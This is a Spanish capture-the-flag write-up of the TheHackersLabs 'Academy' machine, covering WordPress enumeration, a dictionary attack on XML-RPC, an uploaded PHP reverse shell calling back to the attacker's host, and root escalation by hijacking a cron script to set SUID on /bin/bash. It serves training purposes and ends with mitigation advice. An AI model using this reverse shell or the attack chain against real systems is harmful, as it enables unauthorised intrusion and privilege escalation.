---
title: "TheHackersLabs: Academy"
date: 2026-10-11
draft: false
plataforma: "The Hackers Labs"
tags: ["ctf", "thehackerslabs", "wordpress", "xmlrpc", "password-attack", "reverse-shell", "cron", "pspy", "suid", "privilege-escalation"]
categories: ["writeups"]
summary: "Recorrido completo de la máquina Academy de TheHackersLabs: enumeración de una instalación WordPress, obtención de credenciales mediante ataque de diccionario sobre XML-RPC, acceso inicial con una shell PHP y escalada de privilegios abusando de una tarea cron ejecutada como root que invoca un script dentro de un directorio controlado por www-data."
sistema: ["linux"]
dificultad: "principiante"
---

*Un recorrido completo de la máquina Academy, detallando la enumeración de una instalación WordPress, la identificación de usuarios mediante la API REST, la obtención de una credencial válida mediante un ataque de diccionario contra XML-RPC, el acceso inicial a través de una shell PHP y la escalada de privilegios mediante una tarea cron ejecutada como root sobre un script creado en un directorio controlado por el usuario del servicio web.*

**Publicado el 11 de octubre de 2026 · Por Ne0t3k · 10 minutos de lectura**

La máquina Academy de TheHackersLabs plantea una cadena de ataque que comienza con la enumeración de una instalación WordPress expuesta en el puerto HTTP. La API REST permite identificar un usuario válido y XML-RPC permanece disponible como superficie de autenticación remota. Una contraseña débil incluida en un diccionario permite acceder al panel de WordPress y ejecutar una shell PHP con el contexto del servidor web.

Desde `www-data`, la enumeración local revela credenciales adicionales y varios vectores habituales, como binarios SUID, tareas cron y scripts en directorios no estándar. El hallazgo decisivo llega al monitorizar procesos: cron ejecuta `/opt/backup.sh` como root, pero `/opt` pertenece a `www-data`. La posibilidad de crear ese archivo permite que la tarea privilegiada aplique el bit SUID sobre `/bin/bash`, obteniendo una shell con UID efectivo de root.

IP objetivo: `10.0.2.11`. IP atacante: `10.0.2.3`. Dominio utilizado: `academy.thl`. Las flags, contraseñas y secretos de autenticación se muestran parcialmente censurados para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Descubrimiento de hosts

El primer paso es identificar los hosts activos en el segmento de red del laboratorio:

<pre class="term-log">
<span class="cmd">$ nmap -sP 10.0.2.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 17:35 +0200
Nmap scan report for 10.0.2.1
Host is up (0.00052s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00021s latency).
MAC Address: 08:00:27:EF:2F:3C (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 10.0.2.11</span>
<span class="hl">Host is up (0.00062s latency).</span>
MAC Address: 08:00:27:15:9E:08 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 11.27 seconds
</pre>

**Desglose de parámetros:**

- `-sP`: Identifica equipos activos sin realizar el escaneo de puertos posterior.
- `10.0.2.0/24`: rango de 256 direcciones IP sometido al descubrimiento.

Se identifican cuatro hosts activos. La dirección `10.0.2.11` se selecciona como objetivo de la máquina Academy.

## Reconocimiento — Escaneo de puertos y servicios

Con el host objetivo identificado, se realiza un escaneo exhaustivo sobre el rango completo de puertos TCP:

<pre class="term-log">
<span class="cmd">$ nmap -sSV -A -p- --open -n 10.0.2.11</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-10 17:35 +0200
Nmap scan report for 10.0.2.11
Host is up (0.00071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="hl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
| ssh-hostkey:
|   256 cb:96:e2:96:ae:29:8d:89:da:c0:c6:86:d8:3a:57:12 (ECDSA)
|_  256 8d:8d:c4:c3:5e:ba:f1:2f:ff:1a:d1:97:ef:6a:2f:34 (ED25519)
<span class="hl">80/tcp open  http    Apache httpd 2.4.59 ((Debian))</span>
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:15:9E:08 (Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 10.0.2.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds
</pre>

**Desglose de parámetros:**

- `-sS`: escaneo SYN, que determina el estado de los puertos sin completar el handshake TCP.
- `-sV`: detección de versiones de servicio mediante el análisis de las respuestas recibidas.
- `-A`: activa scripts NSE por defecto, detección de sistema operativo, detección de versiones y traceroute.
- `-p-`: escanea los puertos TCP del 1 al 65.535.
- `--open`: limita la salida a los puertos abiertos.
- `-n`: desactiva la resolución DNS inversa.

El escaneo revela dos servicios relevantes:

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 sobre Debian.
- **Puerto 80 (HTTP)**: Apache 2.4.59, mostrando inicialmente la página por defecto de Apache2.

La identificación de sistema operativo de Nmap debe interpretarse como una estimación. El banner de SSH, el servidor Apache y el posterior acceso a la máquina confirman que el objetivo opera sobre Debian.

## Web — Fuerza bruta de directorios

Con HTTP expuesto, se enumeran directorios y archivos con extensiones habituales de backend:

<pre class="term-log">
<span class="cmd">$ gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 40 -q</span>
index.html           (Status: 200) [Size: 10701]
<span class="hl">wordpress            (Status: 301) [Size: 310] [--> http://10.0.2.11/wordpress/]</span>
server-status        (Status: 403) [Size: 274]
</pre>

**Desglose de parámetros:**

- `dir`: selecciona el modo de enumeración de directorios y archivos.
- `-u`: URL base del objetivo.
- `-w`: wordlist utilizada para generar las solicitudes.
- `-x php,txt,html,bak`: prueba las extensiones indicadas junto a cada entrada del diccionario.
- `-t 40`: ejecuta 40 peticiones concurrentes.
- `-q`: elimina el banner y la salida auxiliar de Gobuster.

El descubrimiento muestra una instalación WordPress en `/wordpress/`. La ruta `/server-status` responde con HTTP 403, por lo que no queda expuesta para consulta desde el contexto utilizado.

## Web — Identificación de WordPress y resolución de dominio

Se consultan las cabeceras de la ruta descubierta:

<pre class="term-log">
<span class="cmd">$ curl -sI http://10.0.2.11/wordpress/</span>
HTTP/1.1 200 OK
Date: Sat, 10 Oct 2026 15:41:26 GMT
Server: Apache/2.4.59 (Debian)
<span class="hl">Link: &lt;http://academy.thl/wordpress/index.php/wp-json/&gt;; rel="https://api.w.org/"</span>
Content-Type: text/html; charset=UTF-8
</pre>

La cabecera `Link` indica que la aplicación publica su API REST a través de `academy.thl`. Para que las siguientes solicitudes utilicen ese nombre, se añade una entrada local:

<pre class="term-log">
<span class="cmd">$ echo "10.0.2.11 academy.thl" | sudo tee -a /etc/hosts</span>
10.0.2.11 academy.thl
</pre>

**Desglose de parámetros:**

- `curl -sI`: realiza una solicitud HEAD y muestra solo las cabeceras de respuesta, sin barra de progreso.
- `tee -a /etc/hosts`: añade la asociación IP-dominio al final del archivo de resolución local.

A partir de este punto, las peticiones se realizan contra `academy.thl`, conservando la cabecera `Host` esperada por la aplicación WordPress.

## Web — Enumeración de usuarios mediante la API REST

La API REST de WordPress permite consultar los usuarios publicados por la instalación:

<pre class="term-log">
<span class="cmd">$ curl -s http://academy.thl/wordpress/index.php/wp-json/wp/v2/users | python3 -m json.tool</span>
[
    {
        "id": 1,
        <span class="hl">"name": "dylan",</span>
        "url": "http://192.168.0.33/wordpress",
        "description": "",
        "link": "http://academy.thl/wordpress/index.php/author/dylan/",
        <span class="hl">"slug": "dylan",</span>
        "avatar_urls": {
            "24": "http://0.gravatar.com/avatar/61a6afb7ae47d1fe1bea084a5805f865?s=24&d=mm&r=g",
            "48": "http://0.gravatar.com/avatar/61a6afb7ae47d1fe1bea084a5805f865?s=48&d=mm&r=g",
            "96": "http://0.gravatar.com/avatar/61a6afb7ae47d1fe1bea084a5805f865?s=96&d=mm&r=g"
        },
        "meta": [],
        "_links": {
            "self": [
                {
                    "href": "http://academy.thl/wordpress/index.php/wp-json/wp/v2/users/1"
                }
            ],
            "collection": [
                {
                    "href": "http://academy.thl/wordpress/index.php/wp-json/wp/v2/users"
                }
            ]
        }
    }
]
</pre>

La respuesta expone al usuario `dylan` tanto como nombre visible como en el campo `slug`. Aunque la API REST no garantiza por sí sola que un slug sea válido para autenticación, permite construir un candidato de usuario para la siguiente fase.

El campo `url` contiene una dirección perteneciente a otro segmento de red. Se conserva como información observada, sin utilizarla como objetivo ni atribuirle un propósito no verificado.

## Web — Enumeración con WPScan

Se amplía la enumeración sobre la instalación WordPress, incluyendo plugins, temas y usuarios:

<pre class="term-log">
<span class="cmd">$ wpscan --url http://academy.thl/wordpress -e ap,at,u</span>

[+] URL: http://academy.thl/wordpress/ [10.0.2.11]

[+] XML-RPC seems to be enabled: http://academy.thl/wordpress/xmlrpc.php

[+] WordPress readme found: http://academy.thl/wordpress/readme.html

[+] Upload directory has listing enabled: http://academy.thl/wordpress/wp-content/uploads/

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).

[+] WordPress theme in use: twentytwentyfour
 | Location: http://academy.thl/wordpress/wp-content/themes/twentytwentyfour/
 | Version: 1.1 (80% confidence)

[+] file-manager
 | Location: http://academy.thl/wordpress/wp-content/plugins/file-manager/
 | Version: 6.5.1 (80% confidence)

[+] Enumerating Users
<span class="hl">[+] dylan</span>
 | Found By: Wp Json Api (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
</pre>

**Desglose de parámetros:**

- `--url`: URL base de la instalación WordPress.
- `-e ap,at,u`: solicita enumeración de todos los plugins, todos los temas y usuarios.

WPScan confirma la presencia de XML-RPC, el usuario `dylan`, WordPress 6.5.3 y el plugin `file-manager` con una versión estimada de 6.5.1. También informa de listados de directorio en varias rutas.

El plugin `file-manager` se conserva como hallazgo de enumeración, pero no se utiliza ni se atribuye a él el acceso inicial: no se documentó una explotación del plugin durante esta resolución. El vector empleado será el servicio XML-RPC y una credencial débil.

## Explotación — Ataque de diccionario contra XML-RPC

Con el usuario `dylan` identificado y XML-RPC habilitado, se realiza un ataque de diccionario utilizando `rockyou.txt`:

<pre class="term-log">
<span class="cmd">$ wpscan --url http://academy.thl/wordpress -U dylan -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc</span>

[+] URL: http://academy.thl/wordpress/ [10.0.2.11]
[+] Started: Sat Oct 10 18:46:22 2026

[+] XML-RPC seems to be enabled: http://academy.thl/wordpress/xmlrpc.php

[+] Performing password attack on Xmlrpc against 1 user/s
<span class="hl-green">[SUCCESS] - dylan / pass********</span>

[!] Valid Combinations Found:
| Username: dylan, Password: pass********

[+] Finished: Sat Oct 10 18:46:27 2026
[+] Requests Done: 62
[+] Elapsed time: 00:00:04
</pre>

**Desglose de parámetros:**

- `-U dylan`: fija el usuario candidato obtenido durante la enumeración.
- `-P /usr/share/wordlists/rockyou.txt`: utiliza el diccionario `rockyou.txt` como fuente de contraseñas.
- `--password-attack xmlrpc`: realiza las comprobaciones de autenticación mediante el endpoint XML-RPC, en lugar de hacerlo contra el formulario de inicio de sesión convencional.

La combinación de credenciales resulta válida. La contraseña se muestra parcialmente censurada, pero la autenticación confirmada permite acceder al panel de WordPress como `dylan`.

El problema no es XML-RPC por sí solo, sino su exposición junto a una contraseña presente en un diccionario ampliamente conocido. WordPress recomienda aplicar controles específicos contra fuerza bruta, como filtrado de automatizaciones, reglas de acceso y protección del login en el perímetro.

## Acceso inicial — Shell reversa como `www-data`

Tras iniciar sesión en WordPress con la cuenta `dylan`, se utiliza el plugin File Manager, identificado durante la enumeración, para subir una shell reversa en PHP. El archivo se guarda como `sh3ll.php` dentro del directorio de la instalación WordPress y queda accesible desde la siguiente ruta:

```text
http://academy.thl/wordpress/sh3ll.php
```

La subida se realiza desde la sesión autenticada de `dylan` en WordPress.

El archivo PHP utilizado establece una conexión saliente hacia la máquina atacante y ejecuta una shell bajo el contexto del servidor web:

```php
<?php
set_time_limit(0);

$ip = '10.0.2.3';
$port = 1234;

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("ERROR: $errstr ($errno)\n");
}

// Intentamos lanzar bash; si no existe, caemos a sh
$cmd = shell_exec('which bash') ? '/bin/bash' : '/bin/sh';

$descriptors = array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'w')
);

$process = proc_open($cmd, $descriptors, $pipes);

if (!is_resource($process)) {
    die("ERROR: no se pudo lanzar el proceso\n");
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, 1400);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], 1400);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], 1400);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

Antes de ejecutar el archivo, se prepara un listener en la máquina atacante para recibir la conexión reversa:

<pre class="term-log">
<span class="cmd">$ nc -nlvp 1234</span>
listening on [any] 1234 ...
</pre>

A continuación, se solicita el archivo PHP desde la máquina atacante para que el servidor lo procese:

<pre class="term-log">
<span class="cmd">$ curl -s http://academy.thl/wordpress/sh3ll.php</span>
</pre>

La máquina objetivo establece una conexión de vuelta al listener. Se comprueban el usuario efectivo de la sesión y el nombre del sistema comprometido. Después, se verifica la disponibilidad de Python 3 y se utiliza para crear una Bash con pseudoterminal:

<pre class="term-log">
<span class="cmd">$ nc -nlvp 1234</span>
listening on [any] 1234 ...
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.11] 35824</span>
<span class="cmd">id &amp;&amp; hostname</span>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
debian
<span class="cmd">which python3</span>
/usr/bin/python3
<span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
www-data@debian:/var/www/html/wordpress$
</pre>

**Desglose de parámetros:**

- `nc -nlvp 1234`:
  - `-n`: evita la resolución DNS.
  - `-l`: activa el modo listener.
  - `-v`: muestra información adicional sobre las conexiones recibidas.
  - `-p 1234`: establece el puerto local de escucha.
- `curl -s http://academy.thl/wordpress/sh3ll.php`: realiza una petición HTTP al archivo PHP subido. La opción `-s` elimina la barra de progreso y los mensajes auxiliares de `curl`.
- `id && hostname`: confirma el usuario efectivo de la shell y el nombre del sistema comprometido.
- `which python3`: comprueba si Python 3 está disponible en el objetivo.
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`: crea un pseudoterminal asociado a Bash, mejorando la interacción respecto a una shell TCP simple.

La sesión se obtiene como `www-data`, el usuario bajo el que se ejecuta Apache. El hostname `debian` coincide con la información de servicio observada durante el escaneo inicial.

## Acceso inicial — Estabilización de la shell

La shell recibida se mejora para facilitar la interacción con el sistema objetivo:

<pre class="term-log">
www-data@debian:/var/www/html/wordpress$ <span class="cmd">export TERM=screen-256color</span>
www-data@debian:/var/www/html/wordpress$ <span class="cmd">source /etc/skel/.bashrc</span>
www-data@debian:/var/www/html/wordpress$ <span class="cmd">^Z</span>

<span class="cmd">$ stty raw -echo; fg</span>
[1]  + continued  nc -nlvp 1234
</pre>

`export TERM=screen-256color` define el tipo de terminal de la sesión remota. Esto permite que aplicaciones y comandos interactivos interpreten correctamente determinadas capacidades del terminal, como colores o secuencias de control.

`source /etc/skel/.bashrc` carga la configuración de Bash disponible en el directorio de plantilla para nuevos usuarios. En este caso, sirve para recuperar parte de la configuración habitual de una sesión Bash.

La combinación `Ctrl+Z`, `stty raw -echo; fg` suspende temporalmente Netcat, ajusta el terminal local y recupera el listener en primer plano:

- `Ctrl+Z`: suspende el proceso de Netcat y devuelve el control a la terminal atacante.
- `stty raw -echo`: activa el modo raw y deshabilita el eco local para evitar que las pulsaciones aparezcan duplicadas.
- `fg`: devuelve el proceso suspendido al primer plano.

La sesión resultante es más manejable que la shell TCP inicial, pero sigue teniendo limitaciones. No equivale a una terminal completamente interactiva con control de trabajos, gestión correcta del redimensionado de ventana y comportamiento idéntico al de una sesión SSH.

## Enumeración local — Configuración de WordPress

Con acceso como `www-data`, se revisa el archivo de configuración de WordPress para identificar credenciales y secretos:

<pre class="term-log">
www-data@debian:/$ <span class="cmd">cat /var/www/html/wordpress/wp-config.php | grep -E 'DB_|AUTH|SALT'</span>
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
<span class="hl">define( 'DB_PASSWORD', 't9sH********' );</span>
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
define( 'AUTH_KEY',         ' @^2********' );
define( 'SECURE_AUTH_KEY',  'gnY+********' );
define( 'AUTH_SALT',        '7f!I********' );
define( 'SECURE_AUTH_SALT', '^=IG********' );
define( 'LOGGED_IN_SALT',   'o}p;********' );
define( 'NONCE_SALT',       'k xN********' );
</pre>

**Desglose de parámetros:**

- `grep -E`: activa expresiones regulares extendidas.
- `'DB_|AUTH|SALT'`: filtra las líneas que contengan la configuración de base de datos, claves de autenticación o sales de WordPress.

La configuración expone la contraseña de la base de datos en texto claro y los valores criptográficos utilizados por WordPress. No se documenta una conexión posterior a MariaDB ni el uso de la credencial de base de datos para la escalada; se conserva como hallazgo adicional de exposición de secretos.

La lectura de `wp-config.php` desde el usuario del servidor web evidencia que la aplicación y sus secretos comparten el mismo contexto de lectura. WordPress recomienda endurecer específicamente los permisos de este archivo.

## Enumeración local — Usuarios del sistema y binarios SUID

Se identifican cuentas locales con shell interactiva y se revisan binarios con el bit SUID activo:

<pre class="term-log">
www-data@debian:/$ <span class="cmd">grep -E 'bash|sh$' /etc/passwd</span>
root:x:0:0:root:/root:/bin/bash
<span class="hl">debian:x:1000:1000:debian,,,:/home/debian:/bin/bash</span>

www-data@debian:/$ <span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
</pre>

**Desglose de parámetros:**

- `grep -E 'bash|sh$' /etc/passwd`: busca cuentas con `/bin/bash` o con una shell terminada en `sh`.
- `find /`: inicia la búsqueda desde la raíz del sistema de archivos.
- `-perm -4000`: selecciona archivos con el bit SUID activo.
- `-type f`: limita la búsqueda a archivos regulares.
- `2>/dev/null`: descarta los errores de permisos enviados por la salida de error estándar.

La cuenta `debian` aparece como el único usuario no privilegiado con directorio propio y shell Bash. Por otro lado, los binarios SUID enumerados corresponden a rutas comunes del sistema y no se explota ninguno de ellos durante la resolución.

En este punto, `/bin/bash` todavía no dispone de bit SUID. Su modificación ocurrirá más adelante como consecuencia de una tarea ejecutada con privilegios de root.

## Enumeración local — Cron y tareas programadas visibles

Se revisan el crontab global y los directorios utilizados por cron:

<pre class="term-log">
www-data@debian:/$ <span class="cmd">cat /etc/crontab; ls -la /etc/cron* 2>/dev/null</span>
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }

 /etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 May  9  2024 .
drwxr-xr-x 74 root root 4096 Oct 10 16:41 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder
-rw-r--r--  1 root root  201 Mar  4  2023 e2scrub_all
-rw-r--r--  1 root root  712 Jul 13  2022 php

 /etc/cron.daily:
total 32
drwxr-xr-x  2 root root 4096 May  9  2024 .
drwxr-xr-x 74 root root 4096 Oct 10 16:41 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder
-rwxr-xr-x  1 root root  539 Oct 11  2023 apache2
-rwxr-xr-x  1 root root 1478 May 25  2023 apt-compat
-rwxr-xr-x  1 root root  123 Mar 26  2023 dpkg
-rwxr-xr-x  1 root root  377 Dec 14  2022 logrotate
-rwxr-xr-x  1 root root 1395 Mar 12  2023 man-db

 /etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May  9  2024 .
drwxr-xr-x 74 root root 4096 Oct 10 16:41 ..
-rw-r--r--  1 root root  102 Mar  2  2023 .placeholder
</pre>

El crontab global únicamente muestra las tareas estándar de mantenimiento. No aparece ninguna referencia directa a `/opt/backup.sh`, por lo que el mecanismo que lo ejecuta no queda identificado mediante esta enumeración estática.

La ausencia de una entrada visible no descarta que exista una tarea programada: puede residir en un crontab de usuario, haber sido configurada fuera de las rutas consultadas o ser invocada por una capa adicional del laboratorio. Para verificar procesos en tiempo de ejecución se utiliza pspy.

## Enumeración local — Directorio /opt y script de backup

Se revisan varios directorios de interés y se identifica un script Python dentro de `/opt`:

<pre class="term-log">
www-data@debian:/$ <span class="cmd">ls -la /opt /home /tmp /var/tmp</span>

/home:
total 12
drwxr-xr-x  3 root   root   4096 May  9  2024 .
drwxr-xr-x 18 root   root   4096 May  9  2024 ..
drwx------  2 debian debian 4096 May 11  2024 debian

/opt:
total 12
<span class="hl">drwxr-xr-x  2 www-data root 4096 May  9  2024 .</span>
drwxr-xr-x 18 root     root 4096 May  9  2024 ..
-r-xr--r--  1 www-data root  538 May  9  2024 backup.py

/tmp:
total 8
drwxrwxrwt  2 root root 4096 Oct 10 16:41 .
drwxr-xr-x 18 root root 4096 May  9  2024 ..

/var/tmp:
total 16
drwxrwxrwt  4 root root 4096 May  9  2024 .
drwxr-xr-x 12 root root 4096 May  9  2024 ..
drwx------  3 root root 4096 May  9  2024 systemd-private-93e4fc72b3234a238bf98f4b14fb1d57-apache2.service-1P0RDa
drwx------  3 root root 4096 May  9  2024 systemd-private-93e4fc72b3234a238bf98f4b14fb1d57-systemd-logind.service-aW8JLz
</pre>

El directorio `/opt` pertenece a `www-data` y dispone de permisos `rwx` para su propietario. Por tanto, la cuenta comprometida puede crear, modificar y eliminar entradas dentro de esa ruta.

Se inspecciona el script presente:

<pre class="term-log">
www-data@debian:/$ <span class="cmd">cat /opt/backup.py</span>
import paramiko

def conectar_ssh(hostname, username, password):
    try:
        cliente_ssh = paramiko.SSHClient()

        cliente_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        cliente_ssh.connect(hostname, username=username, password=password)

        print("Conexión SSH exitosa")

        cliente_ssh.close()
    except SSHException as e:
        print("Error al establecer la conexión SSH:", e)

hostname = "192.168.0.20"
username = "dylan"
<span class="hl">password = "dylan********"</span>

conectar_ssh(hostname, username, password)
</pre>

El script contiene credenciales SSH embebidas para un host perteneciente a otra red. No se documenta una conexión a `192.168.0.20` ni se utiliza este script como parte de la escalada.

El punto relevante de esta fase es la propiedad del directorio `/opt`, no la funcionalidad de `backup.py`. Tener control de un directorio que pueda ser referenciado por un proceso privilegiado crea una condición de riesgo crítica.

## Escalada de privilegios — Monitorización de procesos con pspy

Para identificar procesos que no aparecen en los archivos cron visibles, se descarga y ejecuta pspy desde la máquina comprometida.

En la máquina atacante se expone el binario mediante un servidor HTTP temporal:

<pre class="term-log">
<span class="cmd">$ python3 -m http.server 8080</span>
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.2.11 - - [10/Oct/2026 22:50:30] "GET /pspy64 HTTP/1.1" 200 -
</pre>

En el objetivo se descarga y ejecuta la herramienta:

<pre class="term-log">
www-data@debian:/tmp$ <span class="cmd">cd /tmp &amp;&amp; curl -sO http://10.0.2.3:8080/pspy64 &amp;&amp; chmod +x pspy64 &amp;&amp; ./pspy64 -pf -i 1000</span>

pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
Config: Printing events (colored=true): processes=true | file-system-events=true
Scanning for processes every 1s and on inotify events
Watching directories: [/usr /tmp /etc /home /var /opt] (recursive)

2026/10/10 16:50:31 CMD: UID=33    PID=4409   | ./pspy64 -pf -i 1000
2026/10/10 16:50:31 CMD: UID=0     PID=1191   | /usr/sbin/cron
2026/10/10 16:51:01 CMD: UID=0     PID=4417   | /usr/sbin/CRON
2026/10/10 16:51:01 CMD: UID=0     PID=4418   | /usr/sbin/CRON
<span class="hl">2026/10/10 16:51:01 CMD: UID=0     PID=4419   | /bin/sh -c /opt/backup.sh</span>
</pre>

**Desglose de parámetros:**

- `python3 -m http.server 8080`: expone el directorio actual mediante HTTP en el puerto 8080.
- `curl -sO`: descarga el archivo conservando el nombre indicado por el servidor y sin mostrar información adicional.
- `chmod +x pspy64`: concede permiso de ejecución al binario descargado.
- `-p`: muestra eventos de creación de procesos.
- `-f`: muestra eventos del sistema de archivos.
- `-i 1000`: establece un intervalo de comprobación de procesos de 1000 milisegundos.

pspy permite observar procesos sin requerir privilegios de root, combinando la inspección de `/proc` con eventos del sistema de archivos. Su utilidad aquí consiste en detectar ejecuciones de corta duración que no habían aparecido en los archivos cron revisados.

La salida confirma que cron invoca `/opt/backup.sh` con UID 0. En ese momento, dicho archivo no existía durante la primera enumeración de `/opt`, pero el directorio que lo contiene pertenece a `www-data`.

Esta combinación constituye el vector de escalada:

1. Root ejecuta `/opt/backup.sh`.
2. `/opt` pertenece a `www-data`.
3. `www-data` puede crear el archivo esperado.
4. El contenido creado se ejecutará con privilegios de root durante la siguiente invocación.

## Escalada de privilegios — Secuestro del script ejecutado por cron

Se crea el archivo observado por pspy dentro de `/opt`:

<pre class="term-log">
www-data@debian:/tmp$ <span class="cmd">nano /opt/backup.sh</span>
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

www-data@debian:/tmp$ <span class="cmd">cat /opt/backup.sh</span>
#!/bin/bash
<span class="hl">chmod 4777 /bin/bash</span>

www-data@debian:/tmp$ <span class="cmd">chmod +x /opt/backup.sh</span>

www-data@debian:/tmp$ <span class="cmd">ls -la /opt/</span>
total 16
drwxr-xr-x  2 www-data root     4096 Oct 10 16:52 .
drwxr-xr-x 18 root     root     4096 May  9  2024 ..
-r-xr--r--  1 www-data root      538 May  9  2024 backup.py
<span class="hl">-rwxr-xr-x  1 www-data www-data   33 Oct 10 16:52 backup.sh</span>
</pre>

La advertencia de Nano no impide guardar el archivo: se refiere al directorio donde el editor intenta almacenar su historial o la posición del cursor. La comprobación posterior con `cat` y `ls` confirma que `backup.sh` se ha creado y es ejecutable.

El payload contiene:

```bash
chmod 4777 /bin/bash
```

El primer dígito, `4`, establece el bit SUID. Los tres dígitos restantes, `777`, habilitan lectura, escritura y ejecución para propietario, grupo y otros. Cuando root ejecuta este `chmod`, `/bin/bash` queda configurado para ejecutarse con el UID efectivo de su propietario, root.

El modo resultante es inseguro por dos motivos:

- El bit SUID permite que el proceso ejecutado adopte el UID efectivo del propietario.
- Los permisos `777` permiten además que cualquier usuario modifique el binario, empeorando todavía más el impacto.

Los permisos de directorio determinan quién puede crear o eliminar archivos dentro de él; en este caso, la escritura de `www-data` sobre `/opt` es el requisito que hace posible el secuestro del script privilegiado.

## Flags — Acceso a la shell root

Tras la ejecución de la tarea cron, se comprueba el nuevo modo de `/bin/bash` y se inicia una shell privilegiada:

<pre class="term-log">
www-data@debian:/tmp$ <span class="cmd">ls -l /bin/bash</span>
<span class="hl-green">-rwsrwxrwx 1 root root 1265648 Apr 23  2023 /bin/bash</span>

www-data@debian:/tmp$ <span class="cmd">bash -p</span>
bash-5.2# <span class="cmd">id</span>
<span class="hl-green">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span>

bash-5.2# <span class="cmd">cat /home/debian/user.txt</span>
<span class="hl-green">f3e4********</span>

bash-5.2# <span class="cmd">cat /root/root.txt</span>
<span class="hl-green">3953********</span>
</pre>

`bash -p` inicia Bash en modo privilegiado. El resultado de `id` confirma la diferencia entre el UID real y el UID efectivo:

- UID real: `33`, correspondiente a `www-data`.
- UID efectivo: `0`, correspondiente a root.

La shell conserva el identificador efectivo de root y permite leer tanto la flag de usuario ubicada en `/home/debian/user.txt` como la flag de root ubicada en `/root/root.txt`.

## Recomendaciones de mitigación

- WordPress y XML-RPC: sustituir la contraseña débil de `dylan` por una larga y única, limitar los intentos de autenticación y deshabilitar `xmlrpc.php` si no existen integraciones que lo necesiten. Si debe permanecer disponible, aplicar controles también sobre este endpoint, no solo sobre el formulario de acceso, siguiendo la [documentación de WordPress sobre ataques de fuerza bruta](https://developer.wordpress.org/advanced-administration/security/brute-force/).

